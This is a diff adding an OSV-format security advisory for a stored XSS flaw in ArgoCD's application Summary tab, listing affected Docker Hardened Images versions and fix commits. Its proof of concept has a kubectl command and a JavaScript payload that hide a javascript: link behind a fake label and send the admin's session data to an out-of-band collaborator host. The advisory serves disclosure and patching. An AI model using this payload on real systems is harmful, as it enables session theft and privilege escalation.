@@ -1,0 +1,199 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-xmrm-rmmt-5djq-q4pn",
+  "modified": "2026-09-21T18:28:56Z",
+  "published": "2026-09-21T18:28:56Z",
+  "upstream": [
+    "CVE-2026-45738"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\nA user with **application write access (developer role)** can set `link.argocd.argoproj.io/*` annotations on any ArgoCD Application. These annotation values are rendered in the Summary tab's **URLs section** as `<a href>` elements without URL validation. Using the pipe-separator trick (`Display Text | javascript:...`), an attacker can inject a `javascript:` URI while displaying a legitimate-looking label (e.g. `GitHub Repo`). When a higher-privileged user (admin) clicks the link, **arbitrary JavaScript executes in the ArgoCD origin context** in the admin's authenticated session context, enabling API exfiltration and privilege escalation from developer to admin.\n\n### Details\n\n**Vulnerable sink:** `ui/src/app/applications/components/application-summary/application-summary.tsx:277`\n\n```tsx\nconst parts = (url || '').split('|');\n<a key={i} href={parts.length > 1 ? parts[1] : parts[0]} target='_blank'>\n    {parts[0]}\n</a>\n```\n\nThe annotation value is split on `|`. `parts[0]` becomes the visible link label; `parts[1]` becomes the `href`. **No call to `isValidURL()` is made**, unlike the protected `ApplicationURLs` component (`application-urls.tsx:72,80`) which does validate URLs and blocks `javascript:`. The `target='_blank'` opens a new tab that inherits the ArgoCD origin, giving the injected script same-origin fetch access to all ArgoCD APIs using the victim's authenticated session (credentialed `fetch()` calls).\n\n**Root cause:** React 16.x does not block `javascript:` URIs in `href` attributes (this protection was added in React 19). The helper `isValidURL()` exists in `shared/utils.ts` but is **not applied** to this sink.\n\n**CSP:** ArgoCD's default Content Security Policy is `frame-ancestors 'self'` only — no `script-src`, no `connect-src`, no `default-src` — providing **zero XSS execution mitigation**.\n\n### PoC\n\n**Prerequisites:** Developer role with application write access (e.g. RBAC: `p, role:developer, applications, *, */*, allow`).\n\n**Step 1 — Set malicious annotation as developer:**\n\n```bash\nkubectl annotate application <app-name> -n argocd \\\n  'link.argocd.argoproj.io/docs=GitHub Repo|javascript:fetch(\"https://<argocd-host>/api/v1/session/userinfo\",{credentials:\"include\"}).then(r=>r.json()).then(d=>fetch(\"https://xxx.oastify.com/?d=\"+btoa(JSON.stringify(d)),{mode:\"no-cors\"}))'\n```\n\nThe URL section in the admin's Summary tab renders the link as **\"GitHub Repo\"** — the `javascript:` payload is invisible in the displayed text.\n\n**Step 2 — Admin opens Summary tab** of the annotated application and clicks the link.\n\n**Step 3 — JavaScript executes** at the ArgoCD origin and exfiltrates admin session data via out-of-band HTTP request. Tested with Burp Collaborator:\n\n```javascript\n// Payload used during testing (Burp Collaborator OOB):\nfetch(\"https://<argocd-host>/api/v1/session/userinfo\", {credentials:\"include\"})\n  .then(r => r.json())\n  .then(d => fetch(\"https://xxx.oastify.com/?d=\" + btoa(JSON.stringify(d)), {mode:\"no-cors\"}))\n```\n\n**Step 4 — Burp Collaborator received the OOB HTTP interaction** containing the base64-encoded admin session data. Decoded response:\n\n```json\n{\"iss\":\"argocd\",\"loggedIn\":true,\"username\":\"admin\"}\n```\n\n**Tested on:** ArgoCD v3.3.8 (commit 0850e97), React 16.9.3.\n\n### Impact\n\n- **Stored XSS** — payload persists in the Kubernetes Application resource until manually removed\n- **Privilege escalation** — developer role → admin session hijacking via authenticated API calls\n- **Maximum stealth** — the injected link displays as any attacker-chosen text; the `javascript:` href is never visible to the victim\n- **No server-side interaction required** — purely client-side exploit, no network egress needed for execution (exfiltration uses `no-cors` fetch, bypassed by absent `connect-src` CSP)\n- Any admin or operator who views the Summary tab of the compromised application is affected\n\n### Credits\n\nDiscovered and reported by **Jan Kahmen** ([jan@turingpoint.de](mailto:jan@turingpoint.de)) — [turingpoint.de](https://turingpoint.de)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "argocd-image-updater",
+        "purl": "pkg:docker/dhi/argocd-image-updater?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.0.2-debian13",
+        "1.0.2-debian13-dev",
+        "1.0.2-debian13-fips",
+        "1.0.2-debian13-fips-dev",
+        "1.1.0-debian13",
+        "1.1.0-debian13-dev",
+        "1.1.0-debian13-fips",
+        "1.1.0-debian13-fips-dev",
+        "1.1.1-debian13",
+        "1.1.1-debian13-dev",
+        "1.1.1-debian13-fips",
+        "1.1.1-debian13-fips-dev",
+        "1.2.0-debian13",
+        "1.2.0-debian13-dev",
+        "1.2.0-debian13-fips",
+        "1.2.0-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "argocd",
+        "purl": "pkg:docker/dhi/argocd?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "2.14.20-debian13",
+        "2.14.21-debian13",
+        "3.0.13-debian13",
+        "3.0.15-debian13",
+        "3.0.16-debian13",
+        "3.0.17-debian13",
+        "3.0.18-debian13",
+        "3.0.19-debian13",
+        "3.0.20-debian13",
+        "3.0.20-debian13-fips",
+        "3.0.21-debian13",
+        "3.0.21-debian13-fips",
+        "3.0.22-debian13",
+        "3.0.22-debian13-fips",
+        "3.0.23-debian13",
+        "3.0.23-debian13-fips",
+        "3.1.1-debian13",
+        "3.1.10-debian13",
+        "3.1.10-debian13-fips",
+        "3.1.11-debian13",
+        "3.1.11-debian13-fips",
+        "3.1.12-debian13",
+        "3.1.12-debian13-fips",
+        "3.1.13-debian13",
+        "3.1.13-debian13-fips",
+        "3.1.14-debian13",
+        "3.1.14-debian13-fips",
+        "3.1.15-debian13",
+        "3.1.15-debian13-fips",
+        "3.1.16-debian13",
+        "3.1.16-debian13-fips",
+        "3.1.3-debian13",
+        "3.1.4-debian13",
+        "3.1.5-debian13",
+        "3.1.6-debian13",
+        "3.1.7-debian13",
+        "3.1.8-debian13",
+        "3.1.9-debian13",
+        "3.1.9-debian13-fips",
+        "3.2.0-debian13",
+        "3.2.1-debian13",
+        "3.2.1-debian13-fips",
+        "3.2.10-debian13",
+        "3.2.10-debian13-fips",
+        "3.2.11-debian13",
+        "3.2.11-debian13-fips",
+        "3.2.2-debian13",
+        "3.2.2-debian13-fips",
+        "3.2.3-debian13",
+        "3.2.3-debian13-fips",
+        "3.2.4-debian13",
+        "3.2.4-debian13-fips",
+        "3.2.5-debian13",
+        "3.2.5-debian13-fips",
+        "3.2.6-debian13",
+        "3.2.6-debian13-fips",
+        "3.2.7-debian13",
+        "3.2.7-debian13-fips",
+        "3.2.8-debian13",
+        "3.2.8-debian13-fips",
+        "3.2.9-debian13",
+        "3.2.9-debian13-fips",
+        "3.3.2-debian13",
+        "3.3.2-debian13-fips",
+        "3.3.3-debian13",
+        "3.3.3-debian13-fips",
+        "3.3.4-debian13",
+        "3.3.4-debian13-fips",
+        "3.3.5-debian13",
+        "3.3.5-debian13-fips",
+        "3.3.6-debian13",
+        "3.3.6-debian13-fips",
+        "3.3.7-debian13",
+        "3.3.7-debian13-fips",
+        "3.3.8-debian13",
+        "3.3.8-debian13-fips",
+        "3.3.9-debian13",
+        "3.3.9-debian13-fips",
+        "3.4.1-debian13",
+        "3.4.1-debian13-fips"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "argocd",
+        "purl": "pkg:docker/dhi/argocd?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "3.1.0-debian12",
+        "3.1.1-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-xmrm-rmmt-5djq-q4pn"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-h98r-wv3h-fr38"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-h98r-wv3h-fr38"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45738"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/argoproj/argo-cd/commit/c8df5ff7acc403adcee1256da5d87081cd52f0a6"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/argoproj/argo-cd/commit/35ea43c537d6e8948e67f347317fc4f88b325122"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/argoproj/argo-cd/commit/00f83c41dcfd879f34f8e0248c860d704b41cf0f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/argoproj/argo-cd/releases/tag/v3.4.2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/argoproj/argo-cd/releases/tag/v3.3.10"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/argoproj/argo-cd/releases/tag/v3.2.12"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://pkg.go.dev/vuln/GO-2026-5418"
+    }
+  ]
+}
